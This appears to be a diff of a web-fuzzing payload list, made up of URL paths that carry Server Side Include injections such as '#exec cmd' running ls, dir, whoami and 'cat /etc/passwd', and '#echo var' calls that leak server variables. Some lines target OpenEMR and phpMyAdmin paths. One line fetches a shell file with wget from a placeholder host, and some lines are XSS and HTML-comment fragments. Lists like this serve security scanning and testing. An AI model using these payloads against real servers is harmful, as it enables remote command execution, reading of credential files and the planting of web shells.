@@ -1,188 +1,94 @@
 /interface/login/login_frame.php?site="><!--#exec cmd="dir \"--><
-
 /interface/login/login_frame.php?site=<!--#exec cmd="dir \"-->
-
 /interface/login/login_frame.php?site="><!--#exec cmd="ls /"--><
-
 /phpmyadmin/documentation.html?phpmyadmin=<!--#exec cmd="dir"-->
-
 /phpmyadmin/documentation.html?phpmyadmin=<!--
-
 /interface/login/login_frame.php?site=<!--#exec cmd="ls /"-->
-
 /phpmyadmin/documentation.html?phpmyadmin=<!--#exec cmd="cat /etc/passwd"-->
-
 /phpmyadmin/phpmyadmin.css.php?collation_connection=utf8_general_ci&convcharset=utf-8&js_frame=right&lang=en-utf-8&nocache=3830415403&token=<!--
-
 /phpmyadmin/documentation.html?phpmyadmin=<!--#include file="nessus1040002851.html"-->
-
 /path0/path1/?payload=<!--#config errmsg="File not found, informs users and password"-->
-
 /path0/?payload=<!--#config timefmt="A %B %d %Y %r"-->
-
 /path0/?payload=<!--#echo var="auth_type" -->
-
 /?payload=<!--#echo var="content_length" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="content_type" -->
-
 /path0/path1/?payload=<!--#echo var="date_gmt" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="date_local" -->
-
 /path0/?payload=<!--#echo var="DATE_LOCAL" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="document_name" -->
-
 /?payload=<!--#echo var="DOCUMENT_NAME" -->
-
 /path0/path1/?payload=<!--#echo var="document_root" -->
-
 /?payload=<!--#echo var="document_uri" -->
-
 /path0/path1/path2/?payload=<!--#echo var="DOCUMENT_URI" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="forwarded" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="from" -->
-
 /?payload=<!--#echo var="gateway_interface" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="http_accept" -->
-
 /path0/path1/?payload=<!--#echo var="http_accept_charset" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="http_accept_encoding" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="http_accept_language" -->
-
 /path0/path1/path2/?payload=<!--#echo var="http_client_ip" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="http_connection" -->
-
 /path0/path1/path2/?payload=<!--#echo var="http_cookie" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="http_form" -->
-
 /path0/path1/path2/?payload=<!--#echo var="http_host" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="http_referer" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="http_ua_cpu" -->
-
 /?payload=<!--#echo var="http_ua_os" -->
-
 /path0/?payload=<!--#echo var="http_user_agent" -->
-
 /path0/?payload=<!--#echo var="last_modified" -->
-
 /?payload=<!--#echo var="netsite_root" -->
-
 /path0/path1/?payload=<!--#echo var="page_count" -->
-
 /path0/path1/path2/?payload=<!--#echo var="path" -->
-
 /path0/path1/?payload=<!--#echo var="path_info" -->
-
 /path0/?payload=<!--#echo var="path_info_translated" -->
-
 /?payload=<!--#echo var="path_translated" -->
-
 /path0/?payload=<!--#echo var="query_string" -->
-
 /path0/path1/?payload=<!--#echo var="query_string_unescaped" -->
-
 /?payload=<!--#echo var="remote_addr" -->
-
 /?payload=<!--#echo var="remote_host" -->
-
 /path0/path1/path2/?payload=<!--#echo var="remote_ident" -->
-
 /path0/path1/?payload=<!--#echo var="remote_port" -->
-
 /path0/path1/?payload=<!--#echo var="remote_user" -->
-
 /?payload=<!--#echo var="request_method" -->
-
 /path0/?payload=<!--#echo var="request_uri" -->
-
 /path0/?payload=<!--#echo var="script_filename" -->
-
 /path0/?payload=<!--#echo var="script_name" -->
-
 /path0/path1/path2/?payload=<!--#echo var="script_uri" -->
-
 /path0/path1/path2/?payload=<!--#echo var="script_url" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="server_addr" -->
-
 /?payload=<!--#echo var="server_admin" -->
-
 /path0/?payload=<!--#echo var="server_name -->
-
 /path0/path1/path2/?payload=<!--#echo var="server_port" -->
-
 /path0/path1/path2/?payload=<!--#echo var="server_protocol" -->
-
 /path0/?payload=<!--#echo var="server_software" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="site_htmlroot" -->
-
 /path0/path1/path2/path3/?payload=<!--#echo var="total_hits" -->
-
 /path0/path1/path2/?payload=<!--#echo var="tz" -->
-
 /path0/path1/?payload=<!--#echo var="unique_id" -->
-
 /path0/path1/?payload=<!--#echo var="user_name" -->
-
 /?payload=<!--#exec cmd="/bin/ls /" -->
-
 /path0/path1/path2/path3/?payload=<!--#exec cmd="cd C:\WINDOWS\System32">
-
 /path0/path1/?payload=<!--#exec cmd="dir" -->
-
 /path0/path1/path2/?payload=<!--#exec cmd="ls" -->
-
 /?payload=<!--#exec cmd="wget http://website.com/dir/shell.txt" -->
-
 /path0/path1/path2/?payload=<!--#exec cmd="whoami"-->
-
 /path0/?payload=<!--#flastmod virtual="echo.html" -->
-
 /path0/?payload=<!--#fsize file="ssi.shtml" -->
-
 /path0/path1/path2/?payload=<!--#include file=?UUUUUUUU...UU?-->
-
 /path0/?payload=<!--#printenv -->
-
 /?payload=<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
-
 /path0/?payload=<!-- IE 6-9 -->
-
 /path0/path1/path2/path3/?payload=<!-- Up to Opera 11.64 - see link below -->
-
 /path0/?payload=<!-- Up to Opera 12.x -->
-
 /path0/path1/?payload=<!-- IE 10 in IE5-9 Standards mode -->
-
 /path0/path1/?payload=<!--
-
 /path0/?payload=--><!--*{color:red}   /* all UA */
-
 /path0/path1/path2/path3/?payload=<!-- IE 5-9 standards mode -->
-
 /path0/?payload=-->
-
 /path0/path1/path2/path3/?payload=<!-- up to FF 13 -->
-
 /path0/path1/?payload=<!-- FF 14+ -->
-
 /path0/path1/path2/?payload=*['<!--']{}
-
 /path0/?payload=-->{}
-
 /?payload=<!><!----><?></>
-
 /path0/path1/?payload=--><d/ /ondrag=co\u006efir\u006d(2)>hello.
-
